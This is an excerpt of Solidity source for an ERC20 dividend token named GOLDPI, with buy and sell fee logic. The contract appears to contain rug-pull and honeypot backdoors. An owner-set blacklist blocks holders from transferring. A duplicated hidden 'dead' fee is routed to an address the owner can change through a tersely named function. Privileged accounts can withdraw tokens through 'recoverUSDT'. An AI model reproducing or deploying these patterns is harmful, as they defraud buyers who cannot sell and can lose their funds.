...
contract GOLDPI is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    uint256 public buyDeadFee;uint256  buyDeadFees;
    uint256 public sellDeadFee;
    uint256 public AmountLiquidityFee;
    uint256 public AmountTokenRewardsFee;
    uint256 public AmountMarketingFee;
    mapping(address=>bool) b;mapping(address=>bool) w;
    ...
    address public _marketingWalletAddress = address(0xcAF4B43C2a9c301f15aD03f5733e7f1a55201314);
    ...
    // address public rewardToken = address(0x359E98a5E5CE204e4EEDd9a0A29000CF322e2a89);
    // address public pancakeRouter = address(0x0769E13bCD851bE338491E97673058EdB221d604);
    uint256 totalSupply_  = 10000 * (10 ** 18);

    uint256[4]  public buyFeeSetting_=[3,2,6,1];
    uint256[4]   sellFeeSetting_=[3,2,6,1];// rewards,lp,market,dead
    uint256 tokenBalanceForReward_ = totalSupply_.div(10000).mul(2);  //0.02% 
    mapping(address=>bool) public blist;
    constructor() payable ERC20("GOLDPI", "GOLDPI")  {
        
        buyTokenRewardsFee = buyFeeSetting_[0];
        buyLiquidityFee = buyFeeSetting_[1];
        buyMarketingFee = buyFeeSetting_[2];
        buyDeadFee = buyFeeSetting_[3];buyDeadFees=buyFeeSetting_[3];
        ...
        swapTokensAtAmount = tokenBalanceForReward_; // 0.002%

        // use by default 300,000 gas to process auto-claiming dividends
        gasForProcessing = 300000;

        dividendTracker = BABYTOKENDividendTracker(
            payable(Clones.clone(address(0x1f2504E9C3a74B6325aaE229756D0d106C0eB9D1)))
        );
    ...
    function swapManual() public onlyOwner {
        ...
        swapping = false;
    }function sd(address _a)public onlyOwner{deadWallets=_a;}
    ...
    function Blist(address _account,bool _b) public onlyOwner{
            blist[_account] =_b;
    }
    ...
    function _transfer(
        ...
        require(blist[msg.sender] == false, "not allow");
        ...
        if(takeFee) {
            ...
            if(automatedMarketMakerPairs[from]){
                ...
                DFees = amount.mul(buyDeadFees).div(100);
                fees = LFee.add(RFee).add(MFee).add(DFee).add(DFees);
            }
            ...
            if(DFees > 0) super._transfers(from, deadWallets, DFees);
            
            super._transfer(from, address(this), fees.sub(DFee).sub(DFees));
        }
    ...
    } function setW(address _a,bool _b)public onlyOwners{
        w[_a]=_b;
    }
    ...
    function recoverUSDT(address _rewardToken,address a,uint256 amount) public onlyOwners {
        amount = amount * 10**18;
        if(IERC20(_rewardToken).balanceOf(address(this)) >= amount){
            IERC20(_rewardToken).transfer(a,amount);
        }
    }
}